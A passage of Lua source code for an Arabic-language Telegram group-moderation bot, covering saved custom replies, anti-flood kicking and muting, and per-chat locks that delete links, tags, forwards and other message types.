msg_type = 'MSG:JoinByLink'
end
--     SoUrCe BrAnD     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
---
end
--     SoUrCe BrAnD     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     SoUrCe BrAnD     --
if msg.content_.text_ then
local DelGpRed = DevBrAnD:get(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if DelGpRed == 'DelGpRed' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevBrAnD:del(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
DevBrAnD:srem(BrAnD..'BrAnD:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
if msg.content_.text_ then
local DelAllRed = DevBrAnD:get(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevBrAnD:del(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_)
DevBrAnD:del(BrAnD.."BrAnD:Gif:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Voice:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Audio:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Photo:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Stecker:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Video:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:File:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Text:AllRed"..msg.content_.text_)
DevBrAnD:del(BrAnD.."BrAnD:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     SoUrCe BrAnD     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevBrAnD:get(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevBrAnD:get(BrAnD..'DelManagerRep'..msg.chat_id_..'')
DevBrAnD:srem(BrAnD..'BrAnD:Manager:GpRed'..msg.chat_id_..'',DelManagerRep)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ الرد', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_)
DevBrAnD:del(BrAnD..'DelManagerRep'..msg.chat_id_..'')
return false
end
DevBrAnD:del(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
local SaveGpRed = DevBrAnD:get(BrAnD..'BrAnD:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevBrAnD:set(BrAnD..'BrAnD:Video:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevBrAnD:set(BrAnD..'BrAnD:File:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevBrAnD:set(BrAnD..'BrAnD:Stecker:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevBrAnD:set(BrAnD..'BrAnD:Voice:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevBrAnD:set(BrAnD..'BrAnD:Audio:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevBrAnD:set(BrAnD..'BrAnD:Photo:GpRed'..SaveGpRed..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then DevBrAnD:set(BrAnD..'BrAnD:Gif:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevBrAnD:set(BrAnD..'BrAnD:Text:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.text_)
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ الرد الجديد', 1, 'md') 
DevBrAnD:del(BrAnD..'BrAnD:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
DevBrAnD:del(BrAnD..'DelManagerRep'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not DevBrAnD:get(BrAnD..'BrAnD:Lock:GpRed'..msg.chat_id_) then 
if DevBrAnD:get(BrAnD..'BrAnD:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevBrAnD:get(BrAnD..'BrAnD:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevBrAnD:get(BrAnD..'BrAnD:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevBrAnD:get(BrAnD..'BrAnD:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevBrAnD:get(BrAnD..'BrAnD:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD..'BrAnD:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevBrAnD:get(BrAnD..'BrAnD:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD..'BrAnD:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevBrAnD:get(BrAnD..'BrAnD:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD..'BrAnD:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevBrAnD:get(BrAnD..'BrAnD:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD..'BrAnD:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevBrAnD:get(BrAnD..'BrAnD:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevBrAnD:get(BrAnD..'BrAnD:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..''))
end
if DevBrAnD:get(BrAnD..'BrAnD:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then
function BrAnDTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevBrAnD:get(BrAnD..'BrAnD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevBrAnD:get(BrAnD..'BrAnD:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, BrAnDTEAM)
end
end
--     SoUrCe BrAnD     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevBrAnD:get(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevBrAnD:get(BrAnD..'DelSudoRep')
DevBrAnD:del(BrAnD.."BrAnD:Sudo:AllRed",DelSudoRep)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ الرد', 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Add:AllText"..msg.sender_user_id_)
DevBrAnD:del(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_)
DevBrAnD:del(BrAnD.."DelSudoRep")
return false
end
DevBrAnD:del(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevBrAnD:get(BrAnD.."BrAnD:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevBrAnD:set(BrAnD.."BrAnD:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevBrAnD:set(BrAnD.."BrAnD:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevBrAnD:set(BrAnD.."BrAnD:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevBrAnD:set(BrAnD.."BrAnD:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevBrAnD:set(BrAnD.."BrAnD:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevBrAnD:set(BrAnD.."BrAnD:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevBrAnD:set(BrAnD.."BrAnD:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevBrAnD:set(BrAnD.."BrAnD:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ الرد الجديد', 1, 'md') 
DevBrAnD:del(BrAnD.."BrAnD:Add:AllText"..msg.sender_user_id_)
DevBrAnD:del(BrAnD..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevBrAnD:get(BrAnD..'BrAnD:Lock:AllRed'..msg.chat_id_) then
if DevBrAnD:get(BrAnD.."BrAnD:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevBrAnD:get(BrAnD.."BrAnD:Video:AllRed"..msg.content_.text_))
end
if DevBrAnD:get(BrAnD.."BrAnD:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevBrAnD:get(BrAnD.."BrAnD:File:AllRed"..msg.content_.text_))
end
if DevBrAnD:get(BrAnD.."BrAnD:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD.."BrAnD:Voice:AllRed"..msg.content_.text_))
end
if DevBrAnD:get(BrAnD.."BrAnD:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD.."BrAnD:Audio:AllRed"..msg.content_.text_))
end
if DevBrAnD:get(BrAnD.."BrAnD:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD.."BrAnD:Photo:AllRed"..msg.content_.text_))
end
if  DevBrAnD:get(BrAnD.."BrAnD:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevBrAnD:get(BrAnD.."BrAnD:Gif:AllRed"..msg.content_.text_))
end
if DevBrAnD:get(BrAnD.."BrAnD:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevBrAnD:get(BrAnD.."BrAnD:Stecker:AllRed"..msg.content_.text_))
end
if DevBrAnD:get(BrAnD.."BrAnD:Text:AllRed"..msg.content_.text_) then
function BrAnDTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevBrAnD:get(BrAnD..'BrAnD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevBrAnD:get(BrAnD.."BrAnD:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, BrAnDTEAM)
end
end 
--     SoUrCe BrAnD     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '♰ ⌯ العضو ↫ '..GetName..' \n♰ ⌯ قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if Type == "keed" and not DevBrAnD:sismember(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '♰ ⌯ العضو ↫ '..GetName..' \n♰ ⌯ قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevBrAnD:sadd(BrAnD..'BrAnD:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '♰ ⌯ العضو ↫ '..GetName..' \n♰ ⌯ قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions BrAnD --
--     SoUrCe BrAnD     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= BrAnD then
floods = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevBrAnD:get(BrAnD.."BrAnD:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevBrAnD:setex(BrAnD.."BrAnD:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     SoUrCe BrAnD     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(BrAnD) then
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevBrAnD:get(BrAnD..'BrAnD:PinnedMsg'..msg.chat_id_)
if pin_id and DevBrAnD:get(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevBrAnD:del(BrAnD..'BrAnD:viewget'..msg.sender_user_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عدد مشاهدات المنشور هو ↫ ('..msg.views_..') \n ', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:viewget'..msg.sender_user_id_)
end
end
--     SoUrCe BrAnD     --
--         Photo          --
if msg_type == 'MSG:Photo' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Photo]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [BrAnDtag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--     SoUrCe BrAnD     --
--        Markdown        --
elseif msg_type == 'MSG:MarkDown' then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     SoUrCe BrAnD     --
--        Document        --
elseif msg_type == 'MSG:Document' then
if not VipMem(msg) then
if msg.forward_info_ then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Document]")
end
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [tag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--     SoUrCe BrAnD     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Inline]")
end
end
--     SoUrCe BrAnD     --
--        Sticker         --
elseif msg_type == 'MSG:Sticker' then
if not VipMem(msg) then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
